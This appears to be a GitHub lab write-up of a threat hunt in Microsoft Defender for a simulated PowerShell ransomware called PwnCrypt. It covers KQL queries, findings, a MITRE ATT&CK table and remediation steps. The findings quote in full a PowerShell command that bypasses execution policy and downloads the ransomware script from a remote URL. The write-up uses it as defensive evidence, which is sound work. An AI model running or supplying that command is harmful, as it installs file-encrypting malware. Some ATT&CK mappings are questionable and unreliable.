# Zero-Day-Ransomware-PwnCrypt-Outbreak

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/84b28057-5767-4402-adaa-68f7214615ca" />

## 📖 Scenario

A new ransomware strain called PwnCrypt has emerged, using a PowerShell-based payload to encrypt files with AES-256 encryption and adding a .pwncrypt extension to targeted files. The CISO is worried about its potential spread to the corporate network and intends to investigate further.

## 🕵️‍♂️ Data Collection
📊 Inspect DeviceFileEvents logs in MS Defender for .pwncrpyt string

```kql
let suspectDevice = "windows10vm";
DeviceFileEvents
| where DeviceName == suspectDevice
| where FileName contains "pwncrypt"
| order by Timestamp desc
| summarize by Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```
<img width="1621" height="663" alt="スクリーンショット 2025-08-05 11 04 54" src="https://github.com/user-attachments/assets/367446b4-c874-470f-8551-f09ae8f0df43" />

🔍 Findings
- Files appended with .pwncrypt indicate the ransomeware has spread to our systems
- Initiating process confirms PowerShell-based script at C:\programdata\pwnscript.ps1 using -ExecutionPolicy Bypass

📊 Inspect DeviceNetworkEvents for any "Invoke-WebRequest" 

```kql
let suspectDevice = "windows10vm";
DeviceNetworkEvents
| where DeviceName == suspectDevice and InitiatingProcessCommandLine contains "Invoke-WebRequest"
| summarize by Timestamp, DeviceName, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
```

<img width="1651" height="521" alt="image" src="https://github.com/user-attachments/assets/06e49924-f2ec-4816-b298-04dc301d8a20" />

🔍Findings
- Confirmed command line run by "labuser" to callout to github and save file locally. "pwncrypt.ps1 to C:\programdata "powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"

## 🔬 Data Analysis

🤔 Hypothothis
- User "labuser," with admin permissions, ran command line code that downloaded PwnCrypt ransomware to the machine. Pwncrypt encoded files and demanded a bitcoin ransom.

🕵️ Evidence
- Data finding of DeviceNetworkEvents and DeviceFileEvents above.

## 🧩 Investigation

- Analysis of the pwncrypt.ps1 file indicates code associated with ransom ware.

## 📂 MITRE ATT&CK TTPs for PwnCrypt Ransomware

| Tactic                | Technique                                      | Description                                                                 |
|----------------------|-----------------------------------------------|-----------------------------------------------------------------------------|
| **Execution**        | **T1059.001 - Command and Scripting Interpreter** | PowerShell-based execution of the ransomware.                             |
| **Persistence**      | **T1053.005 - Scheduled Task/Job**                | Potential creation of scheduled tasks for persistence.                    |
| **Defense Evasion**  | **T1203 - Exploitation for Client Execution**     | Use of `-ExecutionPolicy Bypass` to evade defenses.                      |
| **Impact**           | **T1486 - Data Encrypted for Impact**             | Encrypting files and demanding ransom.                                    |
| **Command and Control** | **T1071.001 - Application Layer Protocol**        | Communication with a remote URL for command and control.                 |


## 🛠️ Remediation

🛑 Containment
- Block traffic to/from assoicated URL
- Isolate endpoints with pwncrypt.ps1 file

🚫 Eradication
- Delete pwncrypt.ps1 file from C:\programdata folder via script
- Terminate additional processes (schedule tasks, etc.)
- Scan network for other signs of infection

🔄 Recovery
- Restore endpoints from last known good backup
- Verify integridy of restored systems
